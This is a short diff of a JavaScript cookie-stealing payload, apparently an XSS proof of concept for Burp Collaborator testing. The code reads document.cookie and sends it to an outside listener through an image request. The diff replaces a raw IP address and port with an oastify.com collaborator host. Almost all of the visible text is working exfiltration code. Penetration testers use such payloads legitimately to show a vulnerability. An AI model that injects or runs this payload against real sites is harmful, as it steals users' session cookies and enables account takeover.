@@ -8,7 +8,7 @@ var cookies = document.cookie;
 alert("Cookies: " + cookies);
 
 // Send the cookies to your Burp Collaborator URL
-var burpCollaboratorURL = "http://13.203.103.154:8445"; // Replace with your actual Burp Collaborator URL
+var burpCollaboratorURL = "http://v51ihydl0ib3zxcdzxu2tw3tpkvbj17q.oastify.com"; // Replace with your actual Burp Collaborator URL
 var img = new Image();
 img.src = burpCollaboratorURL + "/?cookie=" + encodeURIComponent(cookies);
 
